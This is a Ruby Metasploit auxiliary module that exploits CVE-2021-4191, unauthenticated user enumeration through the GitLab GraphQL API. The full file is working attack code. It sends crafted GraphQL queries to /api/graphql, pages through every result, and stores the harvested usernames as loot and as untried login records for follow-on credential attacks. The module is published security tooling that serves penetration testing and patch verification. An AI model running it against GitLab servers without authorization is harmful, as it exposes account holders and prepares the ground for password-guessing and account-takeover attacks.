##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GitLab GraphQL API User Enumeration',
        'Description' => %q{
          This module queries the GitLab GraphQL API without authentication
          to acquire the list of GitLab users (CVE-2021-4191). The module works
          on all GitLab versions from 13.0 up to 14.8.2, 14.7.4, and 14.6.5.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'jbaines-r7', # Independent discovery and Metasploit module
          'mungsul' # Independent discovery
        ],
        'References' => [
          [ 'CVE', '2021-4191' ],
          [ 'URL', 'https://about.gitlab.com/releases/2022/02/25/critical-security-release-gitlab-14-8-2-released/#unauthenticated-user-enumeration-on-graphql-api'],
          [ 'URL', 'https://www.rapid7.com/blog/post/2022/03/03/cve-2021-4191-gitlab-graphql-api-user-enumeration-fixed/']
        ],
        'DisclosureDate' => '2022-02-25',
        'DefaultOptions' => {
          'RPORT' => 443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Base path', '/'])
    ])
  end

  ##
  # Send the GraphQL query to the /api/graphql endpoint. Despite being able to
  # extract significantly more information, this request will only request
  # usernames. The function will do some verification to ensure the received
  # payload is the expected JSON.
  #
  # @param after [String] The parameter is used for paging because GitLab will only
  #   return 100 results at a time. If no paging is needed this should be empty.
  # @return [Hash] A Ruby Hash representation of the returned JSON data.
  ##
  def do_request(after)
    graphql_query = '{"query": "query { users'
    unless after.empty?
      graphql_query += "(after:\\\"#{after}\\\")"
    end
    graphql_query.concat(' { pageInfo { hasNextPage, hasPreviousPage, endCursor, startCursor }, nodes { username } } }" }')

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/api/graphql'),
      'ctype' => 'application/json',
      'data' => graphql_query
    })

    fail_with(Failure::UnexpectedReply, "The target didn't respond with 200 OK") unless res&.code == 200
    fail_with(Failure::UnexpectedReply, "The target didn't respond with an HTTP body") unless res.body

    user_json = res.get_json_document
    fail_with(Failure::UnexpectedReply, "The target didn't return a JSON body") if user_json.nil?

    nodes = user_json.dig('data', 'users', 'nodes')
    fail_with(Failure::UnexpectedReply, 'Could not find nodes in the JSON body') if nodes.nil?

    user_json
  end

  ##
  # Parses the JSON data returned by the server. Adds the usernames to
  # the users array and adds them, indirectly, to create_credential_login.
  # This function also determines if we need to request more data from
  # the server.
  #
  # @param user_json [Hash] The JSON data provided by the server
  # @param users [Array] An array to store new usernames in
  # @return [String] An empty string or the "endCursor" to use with do_request
  ##
  def parse_json(user_json, users)
    nodes = user_json.dig('data', 'users', 'nodes')
    return '' if nodes.nil?

    nodes.each do |node|
      username = node['username']
      store_username(username, node)
      users.push(username)
    end

    query_paging_info = ''
    more_data = user_json.dig('data', 'users', 'pageInfo', 'hasNextPage')
    if !more_data.nil? && more_data == true
      query_paging_info = user_json['data']['users']['pageInfo']['endCursor']
    end

    query_paging_info
  end

  def store_userlist(users, service)
    loot = store_loot('gitlab.users', 'text/plain', rhost, users, nil, 'GitLab Users', service)
    print_good("Userlist stored at #{loot}")
  end

  def store_username(username, json)
    connection_details = {
      module_fullname: fullname,
      workspace_id: myworkspace_id,
      username: username,
      proof: json,
      status: Metasploit::Model::Login::Status::UNTRIED
    }.merge(service_details)
    create_credential_and_login(connection_details)
  end

  ##
  # Send an initial GraphQL request to the server and keep sending
  # requests until the server has no more data to give us.
  ##
  def run_host(_ip)
    user_json = do_request('')

    service = report_service(
      host: rhost,
      port: rport,
      name: (ssl ? 'https' : 'http'),
      proto: 'tcp'
    )

    # parse the initial page
    users = []
    query_paging_info = parse_json(user_json, users)

    # handle any follow on pages
    request_count = 0
    until query_paging_info.empty?
      # periodically tell the user that we are still working. Start at 1 since one request already happened
      request_count += 1
      print_status("GraphQL API pagination request: #{request_count}") if request_count % 5 == 0
      user_json = do_request(query_paging_info)
      query_paging_info = parse_json(user_json, users)
    end

    if users.empty?
      print_error('No GitLab users were enumerated.')
    else
      print_good("Enumerated #{users.length} GitLab users")
      users_string = users.join("\n") + "\n"
      store_userlist(users_string, service)
    end
  end
end
